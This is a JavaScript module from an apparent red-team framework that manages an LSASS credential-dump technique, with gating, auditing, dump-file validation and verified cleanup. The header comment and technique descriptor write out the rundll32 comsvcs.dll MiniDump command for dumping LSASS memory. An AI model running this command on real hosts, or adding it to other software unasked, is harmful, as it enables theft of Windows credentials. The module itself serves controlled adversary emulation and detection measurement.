// VARVEL — the GOVERNED AD TIER, rung 3: CREDENTIAL ACCESS — LSASS VIA COMSVCS
// (PURE gate/spec + the minidump marker validator + the cleanup-proof dump-file
// bookkeeping). The published LOLBin method:
//
//   rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <lsass-pid> <path> full
//
// — a Microsoft-signed binary writing a process dump, the technique every enterprise
// detection team watches FIRST. That is exactly why this rung exists the VARVEL way:
// the capability is MEASURED against the hardened range (edrview pairing is
// MANDATORY — Sysmon process-access 10 on lsass.exe, Security 4656/4663 where SACLs
// are set, Defender behavior detections), never claimed.
//
// HARD BOUNDARIES (non-negotiable):
//   * THE DUMP NEVER RIDES THE CHANNEL. The file lands in the agent's governed
//     sandbox; the audit trail carries its sha256 + byte count + the validity
//     MARKER only. Operator retrieval is the pre-existing governed artifact-fetch
//     path; parse is OFFLINE operator-side tooling. This module's parser proves
//     the dump is a real MINIDUMP (signature, stream directory, bounds — a MARKER
//     check) and extracts NOTHING ELSE: no credentials, no digests, no previews.
//     Secret-negative tests pin that no evidence shape carries dump content.
//   * LIVE VALIDATION IS RANGE-ONLY. The operator's own host is never a target:
//     this tier validates against the hardened range box, and the hermetic suite
//     pins the contract. (House rule, doctrine 2026-08-18.)
//   * Elevation honesty: touching lsass needs SeDebugPrivilege; a non-elevated
//     agent gets an access-denied and the evidence says so (state 'failed'),
//     never a fabricated dump.
//
// THE SIGNATURE DOCTRINE (as persist/execproxy/lateral): the dump file's removal
// is verified by re-read; a removal that cannot verify is LOUD and escalated
// ('cred.dump-remove-failed'); the sweep refuses 'clean' while a dump file persists.
//
// Governance (three seams, all fail-closed):
//   1. ENGAGEMENT GATE — settings key 'cred.access' (default OFF) + the agent's
//      -AllowCredAccess launch flag. Refusals are loud and audited (task.refused).
//   2. SPEC GATE — known kind, safe name handle, optional explicit pid (lsass is
//      resolved agent-side by default); remove requires an explicit scope.
//   3. AUDIT — 'cred.task' at queue (specSha256), then 'cred.dumped' /
//      'cred.dump-removed' / 'cred.dump-remove-failed' / 'cred.dump-status' at
//      intake carrying sha256 + the marker verdict + the verification booleans.

import { createHash } from 'node:crypto';
import { Settings } from './settings.mjs';

const sha256 = (buf) => createHash('sha256').update(buf).digest('hex');

export const CRED_KIND_DUMP = 'cred-dump';
export const CRED_KIND_REMOVE = 'cred-dump-remove';
export const CRED_KIND_STATUS = 'cred-dump-status';
export const CRED_KINDS = new Set([CRED_KIND_DUMP, CRED_KIND_REMOVE, CRED_KIND_STATUS]);

export const CRED_NAME_RE = /^[A-Za-z0-9][A-Za-z0-9_.-]{0,39}$/;
export function credTag(seed) {
  return 'cred-' + sha256(String(seed ?? '')).slice(0, 8);
}

// The one method this rung ships (stage 1): the signed comsvcs MiniDump LOLBin call.
export const CRED_TECHNIQUE = {
  id: 'lsass-comsvcs-minidump',
  hostBinary: 'rundll32.exe',
  module: 'comsvcs.dll',
  export: 'MiniDump',
  targetProcess: 'lsass.exe',
  summary: 'rundll32.exe comsvcs.dll, MiniDump <lsass-pid> <sandbox-path> full — the published signed-host LSASS dump. The most-watched credential-access event in enterprise defense: edrview pairing is MANDATORY (the measure is the point).',
};

// ——— THE MINIDUMP MARKER VALIDATOR (parse-side minimal, by design) ———
// Proves the artifact is a real MINIDUMP and says NOTHING about its contents:
// signature 'MDMP', stream directory count + bounds, every stream's data inside the
// file, and the presence of the streams a comsvcs-class full dump always carries
// (SystemInfo 7; Memory64List 9 or MemoryList 5). The credential material lives in
// the memory regions — this validator NEVER reads a stream's bytes.
export const MINIDUMP_SIGNATURE = 0x504d444d; // 'MDMP'
export const MINIDUMP_STREAM = { ThreadList: 3, ModuleList: 4, MemoryList: 5, SystemInfo: 7, Memory64List: 9 };

export function validateMinidump(buf) {
  buf = Buffer.isBuffer(buf) ? buf : Buffer.from(buf || []);
  const fail = (reason) => ({ valid: false, reason, streams: 0, streamTypes: [], bytes: buf.length });
  if (buf.length < 32) return fail('too small for a MINIDUMP_HEADER (' + buf.length + ' bytes) — a failed dump (e.g. access-denied) leaves a 0-byte stub; reported honestly');
  if (buf.readUInt32LE(0) !== MINIDUMP_SIGNATURE) return fail('bad signature — not a MINIDUMP (want MDMP)');
  const version = buf.readUInt32LE(4);
  const streams = buf.readUInt32LE(8);
  const dirRva = buf.readUInt32LE(12);
  if (streams < 1 || streams > 256) return fail('stream count ' + streams + ' outside the sane 1..256 band');
  if (dirRva + streams * 12 > buf.length) return fail('stream directory overruns the file (rva ' + dirRva + ', ' + streams + ' streams, file ' + buf.length + ' bytes) — truncated dump');
  const types = [];
  for (let i = 0; i < streams; i++) {
    const off = dirRva + i * 12;
    const type = buf.readUInt32LE(off);
    const size = buf.readUInt32LE(off + 4);
    const rva = buf.readUInt32LE(off + 8);
    if (rva + size > buf.length) return fail('stream ' + type + ' data overruns the file — truncated dump');
    types.push(type);
  }
  if (!types.includes(MINIDUMP_STREAM.SystemInfo)) return fail('no SystemInfo stream — not a well-formed comsvcs-class dump');
  const full = types.includes(MINIDUMP_STREAM.Memory64List) || types.includes(MINIDUMP_STREAM.MemoryList);
  if (!full) return fail('no memory stream (Memory64List/MemoryList) — not a full dump; the marker refuses to call this valid LSASS material');
  return { valid: true, reason: null, streams, streamTypes: types, full, version: version & 0xffff, bytes: buf.length };
}

// ——— SPEC GATE ———
export function parseCredSpec(kind, data) {
  kind = String(kind || '');
  if (!CRED_KINDS.has(kind)) throw new TypeError('credaccess: unknown kind ' + JSON.stringify(kind) + ' (want one of ' + [...CRED_KINDS].join(', ') + ')');
  const raw = String(data ?? '').trim();
  const parseObj = (k, want) => {
    let spec;
    try { spec = JSON.parse(raw); } catch { throw new TypeError(k + ': task data is not valid JSON (want ' + want + ')'); }
    if (!spec || typeof spec !== 'object' || Array.isArray(spec)) throw new TypeError(k + ': task data must be a JSON object');
    return spec;
  };
  const nameFrom = (spec, k) => {
    if (spec.name === undefined || spec.name === null || String(spec.name).trim() === '') return null;
    const name = String(spec.name).trim();
    if (!CRED_NAME_RE.test(name)) throw new TypeError(k + ': name ' + JSON.stringify(name) + ' is not a safe dump handle (want ' + CRED_NAME_RE + ' — it becomes the dump file base name in the governed sandbox)');
    return name;
  };
  if (kind === CRED_KIND_STATUS) {
    if (!raw || raw === '{}') return { kind, name: null };
    const spec = parseObj(kind, '{"name":"cred-xxxxxxxx"}');
    return { kind, name: nameFrom(spec, kind) };
  }
  if (kind === CRED_KIND_REMOVE) {
    if (!raw || raw === '{}') throw new TypeError('cred-dump-remove needs an explicit scope: {"name":"..."} or {"all":true} — removal is never ambiguous');
    const spec = parseObj(kind, '{"name":"..."} or {"all":true}');
    const all = spec.all === true;
    const name = nameFrom(spec, kind);
    if (all && name) throw new TypeError('cred-dump-remove: give name OR all:true, not both — the removal scope must be unambiguous');
    if (!all && !name) throw new TypeError('cred-dump-remove needs an explicit scope: {"name":"..."} or {"all":true}');
    return { kind, name, all };
  }
  // cred-dump: {} or {name} or {name, pid}. The pid is resolved agent-side from
  // 'lsass.exe' by default; an explicit pid is an operator override (validated only —
  // the agent re-verifies the process name honestly and reports what it dumped).
  if (!raw || raw === '{}') return { kind, name: null, pid: null };
  const spec = parseObj(kind, '{"name":"cred-xxxxxxxx"}');
  let pid = null;
  if (spec.pid !== undefined && spec.pid !== null) {
    pid = Math.floor(Number(spec.pid));
    if (!Number.isFinite(pid) || pid < 4 || pid > 4194304) throw new RangeError(kind + ': pid must be an integer in 4..4194304');
  }
  return { kind, name: nameFrom(spec, kind), pid };
}

// The engagement gate. Fail-CLOSED on any settings-layer error.
export function credAccessGate(engagement) {
  let on = false;
  try { on = Settings.for(engagement || 'default').get('cred.access') === true; } catch { on = false; }
  if (!on) {
    return {
      ok: false,
      reason: "engagement setting 'cred.access' is OFF — the credential-access tier is disabled. "
        + "An operator must explicitly enable it for engagement '" + (engagement || 'default') + "' "
        + "(POST /api/settings {key:'cred.access', value:true}) before cred-dump tasks will queue, and the agent must "
        + "have been launched with its own cred-access flag. No dump was attempted.",
    };
  }
  return { ok: true };
}

// The sha256 of the normalized spec — pinned into 'cred.task' at queue time.
export function credSpecSha256(spec) {
  return sha256(JSON.stringify({ kind: spec.kind, name: spec.name || null, pid: spec.pid ?? null, all: spec.all === true }));
}

// ——— CredAccessStore ———
// The PURE state-machine twin of the agent-side ==CREDHOST-LIB== machinery, over an
// INJECTED backend (the real rundll32/filesystem are NEVER touched from Node):
//
// backend = {
//   run(job) -> { code:number, output:string }          // the comsvcs MiniDump invocation
//   probe(path) -> { present, sha256, bytes, mdmp }     // re-read + hash + marker verdict
//   remove(path) -> void                                // delete the dump file
// }
export class CredAccessStore {
  constructor({ backend, name, sandbox, now } = {}) {
    if (!backend || typeof backend.run !== 'function' || typeof backend.probe !== 'function' || typeof backend.remove !== 'function') {
      throw new TypeError('CredAccessStore needs an injected backend { run, probe, remove } — lsass/rundll32/the filesystem are NEVER touched from Node');
    }
    if (!name || !CRED_NAME_RE.test(String(name))) throw new TypeError('CredAccessStore needs a valid name handle (the manifest key / dump file base name)');
    this.backend = backend;
    this.name = String(name);
    this.sandbox = String(sandbox || '%SANDBOX%');
    this._now = typeof now === 'function' ? now : () => new Date().toISOString();
    this.manifest = { version: 1, name: this.name, createdAt: this._now(), entries: {} };
  }

  dumpPath() { return this.sandbox.replace(/[\\/]+$/, '') + '\\' + this.name + '.dmp'; }

  _evidence() {
    return {
      state: 'failed', name: this.name, technique: CRED_TECHNIQUE.id,
      pid: null, dumpPath: this.dumpPath(),
      sha256: null, bytes: null, mdmpValid: null, streams: null,
      removalVerified: null, note: CRED_TECHNIQUE.summary, error: null,
    };
  }

  // dump(): pre-probe (a foreign file at the dump path is a loud refusal), run the
  // signed-host call through the backend, then require the marker + hash from the
  // re-read. A dump that fails the marker check is 'failed' honestly and the stub
  // is removed + verified — we never leave garbage, never claim garbage.
  dump({ pid } = {}) {
    const ev = this._evidence();
    ev.pid = pid ?? null;
    const path = this.dumpPath();
    let pre;
    try { pre = this.backend.probe(path); } catch (e) {
      ev.error = 'pre-dump probe failed: ' + ((e && e.message) || e) + ' — nothing attempted (no snapshot, no write)';
      return ev;
    }
    if (pre && pre.present === true) {
      const ours = this.manifest.entries[this.name];
      if (!ours) {
        ev.state = 'refused-clobber';
        ev.error = 'the dump path already holds a file this tier never wrote — REFUSED to clobber it. cred-dump-remove ours first, or pick another name handle.';
        return ev;
      }
    }
    let r;
    try { r = this.backend.run({ technique: CRED_TECHNIQUE.id, pid: pid ?? null, path }); } catch (e) {
      ev.error = 'signed-host dump failed: ' + ((e && e.message) || e) + ' (a non-elevated agent gets access-denied here — reported honestly, never fabricated)';
      return ev;
    }
    r = r || {};
    ev.exitCode = typeof r.code === 'number' ? r.code : null;
    let post;
    try { post = this.backend.probe(path); } catch (e) {
      ev.error = 'post-dump re-read failed: ' + ((e && e.message) || e) + ' — the dump is UNVERIFIED, reported honestly';
      return ev;
    }
    if (!post || post.present !== true || !post.sha256) {
      ev.error = 'the signed-host call produced no dump file — access-denied or a failed dump (the evidence says which; nothing claimed)';
      return ev;
    }
    ev.sha256 = post.sha256;
    ev.bytes = typeof post.bytes === 'number' ? post.bytes : null;
    ev.mdmpValid = !!(post.mdmp && post.mdmp.valid === true);
    ev.streams = post.mdmp && typeof post.mdmp.streams === 'number' ? post.mdmp.streams : null;
    if (!ev.mdmpValid) {
      // An invalid artifact is not a dump: remove the stub, verify, say so.
      try { this.backend.remove(path); this.backend.probe(path); } catch {}
      ev.state = 'failed';
      ev.error = 'the artifact failed the MINIDUMP marker check (' + ((post.mdmp && post.mdmp.reason) || 'unknown') + ') — the stub was removed; nothing claimed. Parse-side minimalism: validity is a MARKER, never a content read.';
      this._record(ev, 'failed');
      return ev;
    }
    ev.state = 'dumped';
    ev.note += ' The dump STAYS in the governed sandbox; the audit trail carries sha256+bytes+marker only (offline parse is operator-side tooling; retrieval rides the governed artifact-fetch path).';
    this._record(ev, 'dumped');
    return ev;
  }

  _record(ev, state) {
    const prev = this.manifest.entries[this.name];
    this.manifest.entries[this.name] = {
      name: this.name, technique: ev.technique, dumpPath: ev.dumpPath, pid: ev.pid,
      sha256: ev.sha256, bytes: ev.bytes, mdmpValid: ev.mdmpValid, streams: ev.streams,
      state,
      dumpedAt: (prev && prev.dumpedAt) || this._now(),
      removedAt: null, removalVerified: null,
    };
  }

  // status(): LIVE re-read, measured now.
  status() {
    const ev = this._evidence();
    const entry = this.manifest.entries[this.name];
    if (!entry) { ev.state = 'absent'; ev.note = 'no manifest entry — nothing was ever dumped under this name handle (measured now)'; return ev; }
    ev.pid = entry.pid; ev.sha256 = entry.sha256; ev.bytes = entry.bytes; ev.mdmpValid = entry.mdmpValid; ev.streams = entry.streams;
    let cur = null;
    try { cur = this.backend.probe(entry.dumpPath); } catch { cur = null; }
    if (cur === null) { ev.state = 'unknown'; ev.note = 'probe failed — never assume absence'; return ev; }
    if (cur.present) {
      ev.state = cur.sha256 && entry.sha256 && cur.sha256 === entry.sha256 ? 'present' : 'tampered';
      ev.note = ev.state === 'present'
        ? 'the dump file is present and hash-intact at live re-read — cred-dump-remove it before engagement close'
        : 'the dump file\'s bytes CHANGED under us — reported honestly; remove verifies against the recorded hash, never deletes foreign bytes';
      return ev;
    }
    ev.state = 'removed';
    ev.removalVerified = entry.removalVerified === true;
    ev.note = ev.removalVerified ? 'verified absent (removal was proven; still absent at this live re-read)' : 'absent at live re-read (removal was never channel-verified — measured now)';
    return ev;
  }

  // remove(): delete ONLY a file whose live hash still matches what we dumped
  // (a hash-changed file is a loud 'refused-foreign'), then VERIFY absence.
  remove() {
    const ev = this._evidence();
    const entry = this.manifest.entries[this.name];
    if (!entry) { ev.state = 'removed'; ev.removalVerified = true; ev.note = 'nothing was ever dumped under this name handle — verified clean (no manifest entry)'; return ev; }
    ev.pid = entry.pid; ev.sha256 = entry.sha256; ev.bytes = entry.bytes; ev.mdmpValid = entry.mdmpValid; ev.streams = entry.streams;
    let pre = null;
    try { pre = this.backend.probe(entry.dumpPath); } catch { pre = null; }
    if (pre === null) {
      ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
      ev.error = 'pre-remove probe failed — removal UNVERIFIED (LOUD; escalate)';
      return ev;
    }
    if (pre.present && entry.sha256 && pre.sha256 && pre.sha256 !== entry.sha256) {
      ev.state = 'refused-foreign';
      ev.error = 'the dump path now holds DIFFERENT bytes than what we dumped — REFUSED to delete what we did not write (LOUD; escalate to the operator)';
      return ev;
    }
    if (pre.present) {
      try { this.backend.remove(entry.dumpPath); } catch (e) {
        ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
        ev.error = 'remove failed: ' + ((e && e.message) || e) + ' — removal UNVERIFIED (LOUD; escalate)';
        return ev;
      }
    }
    let post = null;
    try { post = this.backend.probe(entry.dumpPath); } catch { post = null; }
    ev.removalVerified = !!(post && post.present === false);
    if (!ev.removalVerified) {
      ev.state = 'removal-failed'; entry.state = 'removal-failed'; entry.removalVerified = false;
      ev.error = 'remove executed but the dump file is STILL PRESENT on re-read — CLEANUP-PROOF FAILED (loud, escalated; the engagement cannot be called clean)';
      return ev;
    }
    ev.state = 'removed';
    ev.note = 'the dump file was deleted and re-read absent — the sandbox provably holds no LSASS material of ours';
    entry.state = 'removed'; entry.removalVerified = true; entry.removedAt = this._now();
    return ev;
  }

  // audit(): the sweep. clean === true ONLY with zero dump files present /
  // removal-unverified under this name handle.
  audit() {
    const entry = this.manifest.entries[this.name];
    if (!entry) return { state: 'clean', clean: true, entries: [], open: [], note: 'nothing was ever dumped under this name handle (empty manifest) — clean' };
    const st = this.status();
    const open = (st.state === 'present' || st.state === 'tampered' || st.state === 'unknown') ? [{ name: this.name, dumpPath: entry.dumpPath, state: st.state, removalVerified: false }] : [];
    const rec = { name: this.name, technique: entry.technique, dumpPath: entry.dumpPath, sha256: entry.sha256, state: st.state, removalVerified: entry.removalVerified === true, dumpedAt: entry.dumpedAt, removedAt: entry.removedAt || null };
    return {
      state: open.length ? 'unclean' : 'clean',
      clean: open.length === 0,
      entries: [rec], open,
      note: open.length
        ? 'the dump file is still present or removal-unverified — the engagement CANNOT be called clean; cred-dump-remove and re-audit'
        : 'the dump under this name handle is verified removed — clean',
    };
  }
}

// ——— INTAKE: agent result body -> the audit event. Carries the sha256 + marker
// verdict + verification booleans ONLY — dump CONTENT (and anything resembling a
// credential) is structurally absent: secret-negative tests pin this. ———
export function parseCredEvidence(body) {
  let p;
  try { p = JSON.parse(String(body || '')); } catch { return null; }
  if (!p || typeof p !== 'object' || typeof p.op !== 'string') return null;
  if (p.op === 'status' || p.op === 'audit') {
    if (typeof p.clean !== 'boolean' || !Array.isArray(p.entries)) return null;
    return {
      event: 'cred.dump-status',
      fields: {
        op: 'status', state: String(p.state || (p.clean ? 'clean' : 'unclean')), clean: p.clean, pid: p.pid ?? null,
        entries: p.entries.filter((e) => e && typeof e === 'object').map((e) => ({
          name: String(e.name || ''), dumpPath: e.dumpPath || null, sha256: e.sha256 || null, state: String(e.state || 'unknown'), removalVerified: e.removalVerified === true,
        })),
        open: Array.isArray(p.open) ? p.open.filter((e) => e && typeof e === 'object').map((e) => ({ name: String(e.name || ''), state: String(e.state || 'unknown') })) : [],
      },
    };
  }
  const event = p.op === 'dump' ? 'cred.dumped' : null;
  if (!p.names || typeof p.names !== 'object') return null;
  const names = {};
  let anyRemovalFailed = false;
  for (const [name, ev] of Object.entries(p.names)) {
    if (!ev || typeof ev !== 'object') continue;
    const state = String(ev.state || 'unknown');
    if (state === 'removal-failed' || state === 'refused-foreign') anyRemovalFailed = true;
    names[name] = {
      state,
      technique: ev.technique || null,
      pid: typeof ev.pid === 'number' ? ev.pid : null,
      dumpPath: ev.dumpPath || null,
      sha256: ev.sha256 || null,
      bytes: typeof ev.bytes === 'number' ? ev.bytes : null,
      mdmpValid: ev.mdmpValid === true,
      streams: typeof ev.streams === 'number' ? ev.streams : null,
      removalVerified: ev.removalVerified === true,
    };
  }
  if (Object.keys(names).length === 0) return null; // NO EVIDENCE, NO EVENT
  const removeEvent = p.op === 'remove' ? (anyRemovalFailed ? 'cred.dump-remove-failed' : 'cred.dump-removed') : null;
  const finalEvent = event || removeEvent;
  if (!finalEvent) return null;
  return {
    event: finalEvent,
    fields: {
      op: p.op, state: String(p.state || 'unknown'), pid: p.pid ?? null, names,
      escalated: finalEvent === 'cred.dump-remove-failed',
    },
  };
}

// The engagement-end sweep over the audit stream: 'clean' ONLY when every dumped
// file (per agent + name) was later closed by a verified removal / clean sweep.
export function assessCredClean(events) {
  const open = new Map(); // agentId|name -> { agentId, name, dumpPath, escalated }
  const closed = [];
  const key = (agentId, name) => String(agentId) + '|' + String(name || '');
  for (const e of events || []) {
    if (!e || typeof e !== 'object') continue;
    if (e.type === 'cred.dumped' && e.names) {
      for (const [n, t] of Object.entries(e.names)) {
        if (t && t.state === 'dumped') open.set(key(e.agentId, n), { agentId: e.agentId, name: n, dumpPath: t.dumpPath || null, escalated: false });
      }
    } else if ((e.type === 'cred.dump-removed' || e.type === 'cred.dump-remove-failed') && e.names) {
      for (const [n, t] of Object.entries(e.names)) {
        if (!t) continue;
        const k = key(e.agentId, n);
        if (t.removalVerified === true) {
          if (open.delete(k)) closed.push({ agentId: e.agentId, name: n });
          else closed.push({ agentId: e.agentId, name: n, untracked: true });
        } else {
          const rec = open.get(k) || { agentId: e.agentId, name: n, dumpPath: t.dumpPath || null };
          rec.escalated = true;
          open.set(k, rec);
        }
      }
    } else if (e.type === 'cred.dump-status' && e.clean === true) {
      for (const [k, rec] of [...open.entries()]) if (rec.agentId === e.agentId) { open.delete(k); closed.push({ ...rec, via: 'sweep' }); }
    } else if (e.type === 'cred.dump-status' && e.clean === false && Array.isArray(e.open)) {
      for (const t of e.open) {
        if (!t) continue;
        open.set(key(e.agentId, t.name), { agentId: e.agentId, name: t.name || null, escalated: true });
      }
    }
  }
  const openList = [...open.values()];
  return {
    clean: openList.length === 0,
    open: openList,
    closed,
    note: openList.length === 0
      ? 'no unremoved LSASS dump files remain — the engagement MAY be called clean'
      : openList.length + ' dump file(s) are still present or removal-unverified — the engagement CANNOT be called clean (cred-dump-remove + cred-dump-status until this set is empty)',
  };
}
